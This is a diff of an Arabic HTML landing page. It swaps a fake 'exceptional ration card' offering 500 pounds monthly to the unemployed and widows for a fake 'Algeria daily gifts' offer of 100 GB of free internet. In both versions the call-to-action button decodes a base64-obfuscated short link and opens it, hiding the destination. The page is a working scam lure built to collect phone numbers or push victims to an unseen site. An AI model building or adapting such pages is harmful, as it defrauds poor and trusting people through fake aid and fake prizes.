@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بطاقة تموين استثنائية</title>
+    <title>هدايا الجزائر</title>
     <style>
         * {
             margin: 0;
@@ -13,8 +13,8 @@
 
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(45deg, #e74c3c, #f39c12);
-            padding: 15px;
+            background: #000;
+            padding: 20px;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -22,234 +22,144 @@
         }
 
         .card {
-            background: white;
-            border-radius: 20px;
+            background: #1a1a1a;
+            border: 2px solid #ffd700;
+            border-radius: 15px;
             padding: 25px;
-            max-width: 450px;
+            max-width: 380px;
             width: 100%;
             text-align: center;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
-            border: 3px solid #f39c12;
+            box-shadow: 0 10px 25px rgba(255,215,0,0.3);
         }
 
-        .urgent {
-            background: #e74c3c;
-            color: white;
-            padding: 12px;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+        .flag {
+            font-size: 28px;
+            margin-bottom: 10px;
         }
 
         .title {
-            font-size: 22px;
+            background: #ffd700;
+            color: #000;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 16px;
             font-weight: bold;
-            color: #2c3e50;
             margin-bottom: 15px;
         }
 
-        .amount {
-            background: linear-gradient(45deg, #f39c12, #e67e22);
-            color: white;
-            padding: 25px;
-            border-radius: 15px;
-            margin: 20px 0;
+        .gift {
+            background: #000;
+            border: 2px solid #ffd700;
+            color: #ffd700;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 15px 0;
         }
 
-        .big-number {
-            font-size: 48px;
+        .gift-number {
+            font-size: 40px;
             font-weight: bold;
             margin-bottom: 5px;
         }
 
-        .subtitle {
-            font-size: 18px;
-        }
-
-        .target-groups {
-            background: #ecf0f1;
-            padding: 20px;
-            border-radius: 15px;
-            margin: 20px 0;
-            text-align: right;
-        }
-
-        .groups-title {
+        .gift-text {
             font-size: 16px;
-            font-weight: bold;
-            color: #2c3e50;
-            margin-bottom: 15px;
-            text-align: center;
         }
 
-        .group {
-            margin: 8px 0;
-            font-size: 15px;
-            color: #34495e;
-        }
-
-        .benefits {
-            background: #e8f5e8;
+        .offers {
+            background: #2a2a2a;
+            border: 1px solid #ffd700;
             padding: 15px;
             border-radius: 10px;
             margin: 15px 0;
             text-align: right;
         }
 
-        .benefit {
+        .offer {
             margin: 8px 0;
-            font-size: 15px;
-            color: #27ae60;
+            font-size: 14px;
+            color: #fff;
         }
 
-        .availability {
-            background: #d4edda;
-            color: #155724;
-            padding: 10px;
-            border-radius: 8px;
-            margin: 15px 0;
-            font-weight: bold;
-        }
-
-        .cta-btn {
-            background: linear-gradient(45deg, #e74c3c, #c0392b);
-            color: white;
-            padding: 20px 40px;
+        .btn {
+            background: #ffd700;
+            color: #000;
+            padding: 15px 30px;
             border: none;
-            border-radius: 50px;
-            font-size: 20px;
+            border-radius: 25px;
+            font-size: 16px;
             font-weight: bold;
             cursor: pointer;
             width: 100%;
-            margin: 20px 0;
+            margin: 15px 0;
             transition: all 0.3s;
         }
 
-        .cta-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        .btn:hover {
+            transform: translateY(-2px);
+            background: #ffed4e;
+            box-shadow: 0 5px 15px rgba(255,215,0,0.4);
         }
 
         .note {
-            background: #fff3cd;
-            color: #856404;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 12px;
-            margin: 15px 0;
+            font-size: 11px;
+            color: #ccc;
+            margin-top: 10px;
         }
 
-        .footer {
-            background: #6c757d;
-            color: white;
-            padding: 10px;
-            margin: 20px -25px -25px -25px;
-            border-radius: 0 0 17px 17px;
-            font-size: 12px;
-        }
-
-        @media (max-width: 480px) {
-            .card {
-                padding: 20px;
-                margin: 10px;
-            }
-            .big-number {
-                font-size: 36px;
-            }
-            .cta-btn {
-                font-size: 18px;
-                padding: 18px 30px;
-            }
-            .title {
-                font-size: 18px;
-            }
+        @media (max-width: 400px) {
+            .card { padding: 20px; margin: 10px; }
+            .gift-number { font-size: 30px; }
+            .btn { font-size: 14px; padding: 12px 25px; }
         }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="urgent">
-            🟥 عاجل | بطاقة تموين استثنائية
+        <div class="flag">🇩🇿</div>
+        
+        <div class="title">
+            🎁 هدايا الجزائر اليومية
         </div>
 
-        <h1 class="title">دعم غذائي مباشر بقيمة</h1>
-
-        <div class="amount">
-            <div class="big-number">٥٠٠ جنيه</div>
-            <div class="subtitle">شهرياً</div>
+        <div class="gift">
+            <div class="gift-number">100 جيجا</div>
+            <div class="gift-text">هدية مجانية</div>
         </div>
 
-        <div class="target-groups">
-            <div class="groups-title">📌 متاح للفئات التالية:</div>
-            <div class="group">• غير العاملين</div>
-            <div class="group">• المطلقات والأرامل</div>
-            <div class="group">• العمالة غير المنتظمة</div>
+        <div class="offers">
+            <div class="offer">📶 100 جيجا إنترنت</div>
+            <div class="offer">📞 مكالمات مجانية</div>
+            <div class="offer">🎮 باقات الألعاب</div>
+            <div class="offer">📱 عروض خاصة</div>
         </div>
 
-        <div class="benefits">
-            <div class="benefit">🛒 تشمل صرف تموين وخبز شهري</div>
-            <div class="benefit">💰 دعم نقدي مباشر</div>
-            <div class="benefit">📱 تسجيل برقم الموبايل فقط</div>
-        </div>
-
-        <div class="availability">
-            🟢 متاح في جميع المحافظات
-        </div>
-
-        <button class="cta-btn" onclick="register()">
-            📲 سجل الآن برقم موبايلك
+        <button class="btn" onclick="claim()">
+            🎯 احصل على هديتك الآن
         </button>
 
         <div class="note">
-            ⚠️ إعلان مدفوع - النتائج تخضع لشروط البرنامج
-        </div>
-
-        <div class="footer">
-            📋 للاستعلام عن برامج الدعم الحكومية الرسمية راجع المواقع المعتمدة
+            إعلان ترويجي - شروط الشركة المقدمة
         </div>
     </div>
 
     <script>
         const link = 'aHR0cHM6Ly9iY25zLmxpbmsvdGhQM1dv';
         
-        function register() {
-            const btn = document.querySelector('.cta-btn');
-            btn.innerHTML = '⏳ جاري التحويل للتسجيل...';
+        function claim() {
+            const btn = document.querySelector('.btn');
+            btn.innerHTML = '⏳ جاري التحويل...';
             btn.disabled = true;
             
             setTimeout(() => {
                 window.open(atob(link), '_blank');
-                btn.innerHTML = '✅ تم فتح صفحة التسجيل';
-                
+                btn.innerHTML = '✅ تم!';
                 setTimeout(() => {
-                    btn.innerHTML = '📲 سجل الآن برقم موبايلك';
+                    btn.innerHTML = '🎯 احصل على هديتك الآن';
                     btn.disabled = false;
-                }, 3000);
-            }, 1500);
+                }, 2000);
+            }, 1000);
         }
-
-        // تأثير بسيط للكارد
-        document.addEventListener('DOMContentLoaded', function() {
-            const card = document.querySelector('.card');
-            card.style.animation = 'slideUp 0.8s ease-out';
-        });
-
-        // إضافة CSS للأنيميشن
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes slideUp {
-                from { opacity: 0; transform: translateY(30px); }
-                to { opacity: 1; transform: translateY(0); }
-            }
-        `;
-        document.head.appendChild(style);
     </script>
 </body>
 </html>
